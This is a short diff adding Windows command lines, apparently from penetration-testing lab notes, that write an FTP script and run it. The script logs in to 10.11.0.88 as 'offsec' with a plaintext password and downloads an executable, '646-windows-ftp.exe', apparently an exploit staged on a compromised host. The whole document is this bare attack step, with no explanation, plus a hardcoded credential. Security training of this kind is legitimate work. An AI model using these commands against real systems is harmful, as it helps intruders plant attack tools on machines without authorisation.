@@ -1,0 +1,7 @@
+echo open 10.11.0.88 21> ftp.txt
+echo USER offsec>> ftp.txt
+echo y9mG2rA8cOn>> ftp.txt
+echo bin >> ftp.txt
+echo GET 646-windows-ftp.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -v -n -s:ftp.txt
